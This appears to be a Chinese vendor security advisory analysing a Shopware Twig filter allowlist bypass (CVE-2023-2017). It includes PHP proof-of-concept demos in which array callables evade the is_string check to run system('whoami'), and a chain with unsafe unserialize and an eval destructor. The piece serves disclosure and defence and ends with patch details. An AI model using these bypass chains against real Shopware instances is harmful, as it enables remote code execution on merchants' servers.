## 漏洞概述

Shopware是一个基于Symfony框架和Vue.js的开源商务平台。近期，其用于防止使用Twig过滤器执行任意PHP函数的Extension存在绕过风险，从而允许攻击者在特定情况下，实现远程代码执行。

## 受影响版本

受影响版本：<= v6.4.20.0，v6.5.0.0-rc1 <= v6.5.0.0-rc4

## 漏洞分析

在阅读本篇文章之前，需要具备一些前置知识：

>   *  **map过滤器**
>

>
> 在Twig
> 3.x中，map过滤器可以接受一个回调函数作为参数，该回调函数将被应用于数组中的每个元素。然而，当攻击者将一个恶意函数作为map过滤器的参数时，就可能会存在问题。例如，{{
> ["whoami"]|map("system")
> }}。这个安全隐患的本质在于，Twig的map过滤器允许用户将任何可调用的函数作为参数传递，包括PHP内置函数和自定义函数，也就是说如果攻击者将一个恶意函数作为参数传递给map过滤器，也会被执行。
>
>   *  **CVE-2023-22731**
>

>
>
> 鉴于攻击者可以在没有Sandbox扩展的Twig环境下，利用过滤器，如map()、filter()、reduce()、sort()引用php函数，从而执行任意代码。官方尝试引入SecurityExtension.php来解决CVE-2023-22731，并确保可调用函数在允许执行的PHP函数列表中。可惜这个防御措施仍存在缺陷。

回到正题，漏洞产生的主要原因是开发者默认可调用类型为string，关键代码（src/Core/Framework/Adapter/Twig/SecurityExtension.php）如下：![](https://image.3001.net/images/20230726/1690364604_64c0eabcbc2b3bc1bb256.png!small)

这正是map过滤器的实现方式，同时也包含了一些安全措施，以防止恶意代码执行。具体来说，它先是检查传递给map过滤器的函数是否为一个字符串，再去判断该函数是否出现在允许使用的PHP函数列表中，如果没有找到，则抛出异常。

这个检查看似强硬严谨，可一旦攻击者传入的$function不是字符串，is_string函数将返回false，从而导致安全检测规则被绕过。

为了便于理解绕过逻辑，可以参考以下demo及两个测试用例：

###  **demo-A**

主要包括了补全上述过滤器实现的MyMap类：

    
    
    class MyMap {
    
        private static $allowedFunctions = ['testA', 'testB'];
    
        public function map(iterable $array, $function): array {
    
            if (is_string($function) && !in_array($function, self::$allowedFunctions, true)) {
                throw new RuntimeException(sprintf('Function "%s" is not allowed', $function));
            }
    
            $result = [];
    
            foreach ($array as $key => $value) {
                $result[$key] = $function($value);
            }
    
            return $result;
    
        }
    
    }

###

###  **测试用例1：**

    
    
    class MyMapTest {
        public function testMap() {
            $myMap = new MyMap();
            // Test case 1
            try {
                $myMap->map([1, 2, 3], 'system');
                echo "Test case 1: Failed - Exception not thrown\n";
            } catch (RuntimeException $e) {
                echo "Test case 1: Blocked\n";
            }
        }
    }

它试图使用map()方法将一个整数数组[1, 2,
3]映射到回调函数system上。然而，在map()方法中，有一个安全函数验证的步骤，它会检查回调函数是否在允许的函数列表中。由于system函数并不在其中，因此安全函数校验阶段就会抛出一个RuntimeException异常，也就是说这次恶意行为被检测到了。![](https://image.3001.net/images/20230726/1690364933_64c0ec0595f18bd036a33.png!small)

###  **测试用例2：**

    
    
    class MyClass {
        public static function myMethod($value) {
            return $value * $value;
        }
    }
    class MyMapTest {
        public function testMap() {
            // Test case 2
            try {
                $arrayCallback = ['MyClass', 'myMethod'];
                $myMap = new MyMap();
                $result = $myMap->map([1, 2, 3], $arrayCallback);
                // 检查MyClass::myMethod()是否被执行
                if ($result === [1, 4, 9]) {
                    echo "Test case 2: Failed - Exception not thrown\n";
                }
            } catch (RuntimeException $e) {
                echo "Test case 2: Blocked\n";
            }
        }
    }

MyClass类定义了一个myMethod静态方法作为MyMap::map()的回调函数，用于接受一个参数并返回其平方值，接着这个用例又创建了一个包含MyClass类名和方法名的数组$arrayCallback，然后实例化MyMap类，并调用map()方法，将一个包含[1,
2, 3]的可迭代数组和$arrayCallback作为参数传递，最后map()方法会将可迭代数组中的每个值作为参数传递给 $arrayCallback
中指定的方法，并将结果存储在一个数组中返回。如果回调函数被成功执行，则意味着map()方法的安全函数验证被绕过。![](https://image.3001.net/images/20230726/1690364979_64c0ec3396fc92b3ae93a.png!small)

 **综上，传递一个数组作为可调用参数，即可绕过安全函数校验。**

 **改进一下myMethod静态方法，即可实现代码执行。**

    
    
    class MyClass {
        public static function myMethod($value) {
            system($value);
        }
    }
    class MyMapTest {
        public function testMap() {
            // Test case 2
            try {
                $arrayCallback = ['MyClass', 'myMethod'];
                $myMap = new MyMap();
                $result = $myMap->map(['whoami'], $arrayCallback);
                echo "Test case 2: Failed - Exception not thrown\n";
            } catch (RuntimeException $e) {
                echo "Test case 2: Blocked\n";
            }
        }
    }

**![](https://image.3001.net/images/20230726/1690365054_64c0ec7e6fc866d971d0f.png!small)当然，回调函数不止静态方法调用这一种，还可以是对象方法等：**

    
    
    class MyClass {
        public static function myMethod($value) {
            system($value);
    }
    public function objMethod($value) {
        $this->myMethod($value);
    }
    }
    class MyMapTest {
        public function testMap() {
            // Test case 2
            try {
    //            $arrayCallback = ['MyClass', 'myMethod'];
                $myMap = new MyMap();
                $obj = new MyClass();
    //            $result = $myMap->map(['whoami'], $arrayCallback);
                $result = $myMap->map(['whoami'], array($obj, "objMethod"));
                echo "Test case 2: Failed - Exception not thrown\n";
            } catch (RuntimeException $e) {
                echo "Test case 2: Blocked\n";
            }
        }
    }

**![](https://image.3001.net/images/20230726/1690365114_64c0ecbad3b26a65cb445.png!small)值得注意的是，reduce()过滤器、filter()过滤器和sort()过滤器与map()过滤器有着相同的代码模式，这也造成了更广的攻击面。![](https://image.3001.net/images/20230726/1690365142_64c0ecd618efd68c635c2.png!small)**

**![](https://image.3001.net/images/20230726/1690365166_64c0eceea132b865fbede.png!small)**

**![](https://image.3001.net/images/20230726/1690365182_64c0ecfeec0a868b41c86.png!small)**

###

## 漏洞复现

回到Shopware代码库中不难发现，它的依赖关系里面有很多静态方法可以实现远程代码执行，比如src/Core/Framework/Adapter/Cache/CacheValueCompressor.php中的uncompress![](https://image.3001.net/images/20230726/1690365210_64c0ed1ae89da28fe014c.png!small)

它的作用是从一个压缩后的缓存值中解压缩出原始的缓存数据。其中，$value可以是一个TCachedContent对象或一个字符串类型的缓存值。如果$value不是一个字符串类型的值，那么这个方法会直接返回$value。如果$value是一个字符串类型的缓存值，那么这个方法会根据是否启用了压缩来进行相应的解压缩操作，如果未启用压缩，那么这个方法会直接使用unserialize函数将字符串反序列化为原始的缓存数据，如果启用了压缩，那么这个方法会先使用gzuncompress函数对字符串进行解压缩操作，然后再将解压缩后的字符串反序列化为原始的缓存数据，
**如果解压缩失败，那么这个方法会抛出一个RuntimeException异常** 。

但这个方法对于$value的处理其实是存在问题的，因为它在使用unserialize函数将字符串反序列化为原始缓存数据之前并没有防御措施。众所周知，反序列化本身就是一个危险的操作，因为它允许攻击者在缓存值中嵌入一个恶意的序列化对象，从而导致代码执行。所以，攻击者完全可以构造一个恶意的序列化字符串传递给
unserialize 函数，实现漏洞利用。

这里可以简单编写个demo-B进行测试，核心代码如下

  * ### CacheValueCompressor类

    
    
      
    

class CacheValueCompressor

{

private static $compress = true;

  

public static function compress($value)

{

$serialized = serialize($value);

return gzcompress($serialized);

}

  

public static function uncompress($value)

{

if (!\is_string($value)) {

return $value;

}

  

if (!self::$compress) {

return \unserialize($value);

}

  

$uncompressed = gzuncompress($value);

if ($uncompressed === false) {

throw new \RuntimeException(sprintf('Could not uncompress "%s"', $value));

}

  

$unserialized = unserialize($uncompressed);

if ($unserialized === false) {

throw new \RuntimeException('Failed to unserialize object');

}

  

return $unserialized;

}

}

这个类包含两个静态方法compress()和uncompress()。compress()方法接受一个值将其序列化并压缩，然后返回压缩后的字符串。uncompress()方法接受一个字符串并尝试解压缩和反序列化它，然后返回反序列化的对象或原始值。如果解压缩或反序列化失败，则会引发RuntimeException异常。

  * ### Example类

    
    
      
    

class Example

{

public $payload;

  

public function __construct($payload)

{

$this->payload = $payload;

}

}

这个类的存在是为了构造一个恶意的Example对象，并将其序列化后存储到缓存中。这样攻击者就可以在$payload属性中插入恶意的PHP代码，以便在后续的反序列化过程中实现代码执行。

  * ### 测试用例

    
    
    $payload = "echo 'hello world';";
    $evil = new Example($payload);
    echo "Serialized evil payload: " . serialize($evil) . "\n";
    
    // 将恶意的 Example 对象压缩并存储在缓存中
    $compressed = CacheValueCompressor::compress($evil);
    echo "Compressed evil payload: $compressed\n";
    
    // 解压缩缓存值并触发反序列化操作
    echo "Uncompressed evil payload:\n";
    try {
        $data = CacheValueCompressor::uncompress($compressed);
        if ($data instanceof Example) {
            $output = shell_exec('php -r ' . escapeshellarg($data->payload));
            echo "Command output: " . $output . "\n";
        } else {
            echo "Failed to unserialize object.\n";
        }
    } catch (\RuntimeException $e) {
        echo "Error: " . $e->getMessage() . "\n";
    }

 **显而易见，这个demo-B成功验证了uncompress()存在的安全隐患：![](https://image.3001.net/images/20230726/1690365612_64c0eeac12bc4793ee697.png!small)**

再结合CVE-2023-2017的绕过逻辑，即可进行组合利用，我们在之前编写的demo-A进行略微修改，演示下攻击思路：

  * ### 新增静态函数uncompress()至MyClass类

    
    
    class MyClass {
        public static function myMethod($value) {
            system($value);
        }
        public function objMethod($value) {
            $this->myMethod($value);
        }
        public static function uncompress($value)
        {
            if (!\is_string($value)) {
                return $value;
            }
    
            $uncompressed = gzuncompress($value);
            if ($uncompressed === false) {
                throw new \RuntimeException(sprintf('Could not uncompress "%s"', $value));
            }
    
            return unserialize($uncompressed);
        }
    }

  * 新增Example类

    
    
    class Example {
        public $payload;
    
        public function __construct($payload) {
            $this->payload = $payload;
        }
    
        public function __destruct() {
            eval($this->payload);
        }
    }

  * 新增测试用例3

    
    
    class MyMapTest {
        public function testMap()
        {
            // Test case 3
            try {
                $myMap = new MyMap();
                $payload = "echo 'hello world';";
                $evil = new Example($payload);
                $compressed = CacheValueCompressor::compress($evil);
                $result = $myMap->map([$compressed], array('MyClass', 'uncompress'));
                echo "Test case 3: Failed - Exception not thrown\n";
            } catch (RuntimeException $e) {
                echo "Test case 3: Blocked\n";
            }
        }
    }

![](https://image.3001.net/images/20230726/1690365716_64c0ef140403790bc4568.png!small)落实到Shopware中，远程攻击者只需具备权限创建或修改后台的Twig模板内容，再进行预览即可实现代码执行。![](https://image.3001.net/images/20230726/1690365740_64c0ef2c40c931bb22253.png!small)

###

## 修复方案

目前Shopware已发布v6.4.20.1以解决此问题，新版本获取链接如下：https://github.com/shopware/platform/releases/tag/v6.4.20.1

网宿云WAF已第一时间支持对该漏洞利用攻击的防护，并持续挖掘分析其他变种攻击方式和各类组件漏洞，第一时间上线防护规则，缩短防护“空窗期”。

